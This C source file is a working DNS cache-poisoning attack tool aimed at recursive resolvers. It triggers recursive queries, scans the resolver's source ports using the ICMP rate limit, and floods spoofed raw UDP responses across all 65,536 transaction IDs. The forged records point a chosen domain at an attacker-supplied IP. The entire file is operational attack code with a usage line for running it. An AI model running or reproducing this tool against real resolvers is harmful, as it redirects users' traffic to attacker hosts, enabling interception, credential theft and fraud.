/*
    Attack tool for recursive.
*/

#include "util.h"
#include "network.h"
#include "dns.h"
#include "scanner.h"
#include "common.h"

// Some options.
unsigned int g_trigger_recur_query_interval = 1;            // Interval (seconds) of DNS query sending.
unsigned int g_spoof_time_gap               = 60000;        // Time gap (microseconds) of spoof sending.
unsigned int g_icmp_limit                   = 50;           // ICMP global limit of target server.
unsigned int g_start_scan_gap               = 2;            // Time gap (seconds) to start scanning.
char*        g_poison_ns                    = "dns.google"; // NS in spoofed response.

char*        g_recur_ip_in;
char*        g_recur_ip_out;
char*        g_scan_src_ip;
char*        g_poison_domain;
char*        g_poison_ip;
char**       g_ns_server_ip_arr;
unsigned int g_ns_server_ip_arr_count;

/* Spoof TXID 0~65535. */
static void spoof_dns_resp(int sockfd, char* src_ip, char* dst_ip, uint16_t dst_port,
        char* domain_name, char* res_ip, char* res_ns) {
    struct dns_query* query[1];
    struct dns_answer* answer[1];
    struct dns_answer* authori[1];
    
    query[0] = new_dns_query_a(domain_name);
    answer[0] = new_dns_answer_a(domain_name, inet_addr(res_ip), RES_TTL);
    authori[0] = new_dns_answer_ns(domain_name, res_ns, RES_TTL);

    // Make DNS packet.
    uint8_t* packet = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
    size_t packet_len = make_dns_packet(packet, DNS_PKT_MAX_LEN, TRUE, 0, query, 1, answer, 1, authori, 1, TRUE);

    // Make UDP packet.
    uint8_t* packet_raw = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
    size_t packet_raw_len = make_udp_packet(packet_raw, DNS_PKT_MAX_LEN, inet_addr(src_ip), inet_addr(dst_ip),
                                            53, dst_port, packet, packet_len);

    // Send RAW packet.
    int i;
    for (i = 0; i <= UINT16_MAX; i++) {
        // Set TXID.
        ((struct dnshdr*)(packet_raw + sizeof(struct iphdr) + sizeof(struct udphdr)))->id = htons(i);

        send_udp_packet(sockfd, packet_raw, packet_raw_len, inet_addr(src_ip), inet_addr(dst_ip),
                        53, dst_port);

        // Prevent packet loss.
        nsleep(1);
    }

    free(packet_raw);
    free(packet);
    free_dns_query(query[0]);
    free_dns_answer(answer[0]);
    free_dns_answer(authori[0]);
}

/* Callback for spoof. */
static void spoof_callback(uint16_t port) {
    int sockfd = make_sockfd_for_spoof();
    printf("[ * ] \tSend spoofed resp...\n");

    // Send spoof, use gap in case of packet loss.
    usleep(g_spoof_time_gap);
    int i;
    for (i = 0; i < g_ns_server_ip_arr_count; i++) {
        spoof_dns_resp(sockfd, g_ns_server_ip_arr[i], g_recur_ip_out, port, g_poison_domain, g_poison_ip,
                       g_poison_ns);
    }
    usleep(g_spoof_time_gap);

    printf("[ * ] \tDone, %d * 65536 packets sent.\n", i);
    close(sockfd);
}

/* Send DNS query to recursive server. */
static void* trigger_recur_query_thread(void* stop_flag) {
    enum DNS_RESP_STAT stat;
    while (TRUE) {
        if (*(int*)stop_flag)
            break;
        
        stat = send_dns_query(g_recur_ip_in, g_poison_domain, g_trigger_recur_query_interval);

        // Stop attack if DNS response normally.
        if (stat == DNS_R_NORMAL) {
            *(int*)stop_flag = TRUE;
            printf("[ * ] Cached.\n");
        }
    }
}

/* Commence attack. */
static void attack(char* recur_ip_in, char* recur_ip_out, char* scan_src_ip, char** ns_server_ip_arr,
        unsigned int ns_server_ip_arr_count, char* poison_domain, char* poison_ip, int verbos) {
    g_recur_ip_in = recur_ip_in;
    g_recur_ip_out = recur_ip_out;
    g_scan_src_ip = scan_src_ip;
    g_poison_domain = poison_domain;
    g_poison_ip = poison_ip;
    g_ns_server_ip_arr = ns_server_ip_arr;
    g_ns_server_ip_arr_count = ns_server_ip_arr_count;

    scan_init();
    scan_set_ignore_dns_port(TRUE);
    scan_set_scan_callback(spoof_callback);

    // Trigger recursive query.
    pthread_t query_thread;
    int stop_flag = FALSE;
    printf("[ * ] Triggering recursive query...\n");
    pthread_create(&query_thread, NULL, trigger_recur_query_thread, &stop_flag);

    // Wait for recursive query.
    sleep(g_start_scan_gap);

    // Scan round and round, only if stop_flag is set.
    while (TRUE) {
        // Check stop_flag.
        if (stop_flag)
            break;

        printf("[ * ] Scanning new round...\n");
        scan(scan_src_ip, recur_ip_out, 1024, 65535, g_icmp_limit, verbos, &stop_flag);
        printf("[ * ] Done.\n");
    }

    // Waite query_thread.
    stop_flag = TRUE;
    pthread_join(query_thread, NULL);
}

int main(int argc, char** argv) {
    int ch;
    char* recur_ip_in = NULL;
    char* recur_ip_out = NULL;
    char* scan_src_ip = NULL;
    char* ns_server_ip_list = NULL;
    char* domain_poisoned = NULL;
    char* poisoned_ip = NULL;
    int verbos = FALSE;

    while ((ch = getopt(argc, argv, "i:o:s:u:d:a:v")) != -1) {
        switch (ch) {
        case 'i':
            recur_ip_in = optarg;
            break;
        case 'o':
            recur_ip_out = optarg;
            break;
        case 's':
            scan_src_ip = optarg;
            break;
        case 'u':
            ns_server_ip_list = optarg;
            break;
        case 'd':
            domain_poisoned = optarg;
            break;
        case 'a':
            poisoned_ip = optarg;
            break;
        case 'v':
            verbos = TRUE;
            break;
        default:
            printf("Unknown arg\n");
            return 1;
        }
    }

    if (recur_ip_in == NULL || recur_ip_out == NULL || scan_src_ip == NULL || ns_server_ip_list == NULL
            || domain_poisoned == NULL || poisoned_ip == NULL) {
        printf("Usage:\n");
        printf("./attack_recur -i <recur_ip_in> -o <recur_ip_out> -s <scan_src_ip> -u <ns_server_ip>:<ns_server_ip> -d <domain_poisoned> -a <poisoned_ip> [-v]\n");
        return 1;
    }

    // Parse input list.
    char** ns_server_ip_arr = (char**)alloc_memory(512);
    unsigned int ns_server_ip_arr_count = strtok_ex(ns_server_ip_arr, 512, ns_server_ip_list, ":");

    printf("[ * ] Start.\n");
    attack(recur_ip_in, recur_ip_out, scan_src_ip, ns_server_ip_arr, ns_server_ip_arr_count, domain_poisoned,
           poisoned_ip, verbos);
    printf("[ * ] Finished.\n");

    free(ns_server_ip_arr);
    return 0;
}
